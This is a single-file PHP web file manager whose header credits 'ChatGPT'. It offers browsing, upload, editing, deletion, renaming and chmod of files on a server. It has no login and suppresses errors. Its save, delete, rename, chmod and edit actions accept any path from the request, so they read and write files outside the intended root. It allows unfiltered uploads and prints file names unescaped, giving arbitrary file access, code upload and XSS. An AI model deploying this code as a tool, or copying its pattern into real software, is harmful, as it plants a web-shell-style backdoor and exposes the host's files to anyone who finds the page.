<?php
// ====================== SIMPLE PHP FILE MANAGER (Bootstrap Icons) ====================== //
// Author: ChatGPT
// Fully functional single-file file manager (no exec/system calls)
// Features: browse dirs, upload, edit, delete, rename, mkdir, chmod
// ====================================================================================== //

error_reporting(0);
set_time_limit(0);

$root = getcwd();
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
if (!$dir || strpos($dir, $root) !== 0) $dir = $root;
$path = realpath($dir) . DIRECTORY_SEPARATOR;

// =================== ACTION HANDLERS =================== //
if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'upload':
            if (!empty($_FILES['file']['name'])) {
                $target = $path . basename($_FILES['file']['name']);
                move_uploaded_file($_FILES['file']['tmp_name'], $target);
            }
            break;
        case 'save':
            file_put_contents($_POST['file'], $_POST['content']);
            break;
        case 'delete':
            $t = $_POST['target'];
            if (is_dir($t)) @rmdir($t);
            elseif (is_file($t)) @unlink($t);
            break;
        case 'rename':
            @rename($_POST['old'], $_POST['new']);
            break;
        case 'mkdir':
            @mkdir($path . $_POST['folder']);
            break;
        case 'chmod':
            @chmod($_POST['target'], octdec($_POST['perm']));
            break;
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

$items = scandir($path);
function perms($f) { return substr(sprintf('%o', fileperms($f)), -4); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PHP File Manager</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
<style>
body { background-color:#0d1117; color:#eee; font-family:monospace; }
a { color:#61dafb; text-decoration:none; }
a:hover { text-decoration:underline; }
.table td, .table th { vertical-align:middle; }
textarea { width:100%; height:400px; background:#000; color:#0f0; border:1px solid #444; padding:10px; font-family:monospace; }
input, button { border-radius:4px; }
</style>
</head>
<body class="p-4">
<div class="container-fluid">
  <h2><i class="bi bi-folder2-open"></i> <?= htmlspecialchars($dir) ?></h2>

  <p>
  <?php if ($dir != $root): ?>
    <a href="?dir=<?= urlencode(dirname($dir)) ?>" class="btn btn-secondary btn-sm"><i class="bi bi-arrow-up"></i> Up</a>
  <?php endif; ?>
  <a href="?dir=<?= urlencode($root) ?>" class="btn btn-primary btn-sm"><i class="bi bi-house"></i> Root</a>
  </p>

  <!-- Upload Form -->
  <form method="post" enctype="multipart/form-data" class="d-inline">
    <input type="hidden" name="action" value="upload">
    <input type="file" name="file" class="form-control d-inline w-auto">
    <button class="btn btn-success btn-sm"><i class="bi bi-upload"></i> Upload</button>
  </form>

  <!-- New Folder -->
  <form method="post" class="d-inline">
    <input type="hidden" name="action" value="mkdir">
    <input name="folder" placeholder="folder name" class="form-control d-inline w-auto">
    <button class="btn btn-warning btn-sm"><i class="bi bi-folder-plus"></i> New Folder</button>
  </form>

  <hr>

  <table class="table table-dark table-hover table-bordered align-middle">
    <thead><tr>
      <th>Name</th><th>Size</th><th>Perms</th><th>Actions</th>
    </tr></thead>
    <tbody>
<?php
foreach ($items as $f):
    if ($f == ".") continue;
    $full = $path . $f;
    echo "<tr>";
    if (is_dir($full)) {
        echo "<td><i class='bi bi-folder-fill text-warning'></i> <a href='?dir=" . urlencode($full) . "'>$f</a></td><td>DIR</td>";
    } else {
        echo "<td><i class='bi bi-file-earmark text-info'></i> $f</td><td>" . filesize($full) . "</td>";
    }
    echo "<td>" . perms($full) . "</td>";
    echo "<td>";

    // Delete
    echo "<form method='post' class='d-inline'>";
    echo "<input type='hidden' name='action' value='delete'>";
    echo "<input type='hidden' name='target' value='" . htmlspecialchars($full) . "'>";
    echo "<button class='btn btn-danger btn-sm' onclick='return confirm(\"Delete $f?\")'><i class='bi bi-trash'></i></button>";
    echo "</form> ";

    // Edit
    if (is_file($full)) {
        echo "<a href='?edit=" . urlencode($full) . "&dir=" . urlencode($dir) . "' class='btn btn-outline-info btn-sm'><i class='bi bi-pencil'></i></a> ";
    }

    // Rename
    echo "<form method='post' class='d-inline'>";
    echo "<input type='hidden' name='action' value='rename'>";
    echo "<input type='hidden' name='old' value='" . htmlspecialchars($full) . "'>";
    echo "<input name='new' placeholder='new name' class='form-control d-inline w-auto'>";
    echo "<button class='btn btn-outline-light btn-sm'><i class='bi bi-arrow-repeat'></i></button>";
    echo "</form> ";

    // CHMOD
    echo "<form method='post' class='d-inline'>";
    echo "<input type='hidden' name='action' value='chmod'>";
    echo "<input type='hidden' name='target' value='" . htmlspecialchars($full) . "'>";
    echo "<input name='perm' placeholder='0755' size='5' class='form-control d-inline w-auto'>";
    echo "<button class='btn btn-outline-warning btn-sm'><i class='bi bi-shield-lock'></i></button>";
    echo "</form>";

    echo "</td></tr>";
endforeach;
?>
    </tbody>
  </table>

<?php
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $file = $_GET['edit'];
    echo "<hr><h4><i class='bi bi-pencil-square'></i> Editing: " . htmlspecialchars(basename($file)) . "</h4>";
    echo "<form method='post'>";
    echo "<input type='hidden' name='action' value='save'>";
    echo "<input type='hidden' name='file' value='" . htmlspecialchars($file) . "'>";
    echo "<textarea name='content'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br>";
    echo "<button class='btn btn-success'><i class='bi bi-save'></i> Save</button>";
    echo "</form>";
}
?>
</div>
</body>
</html>
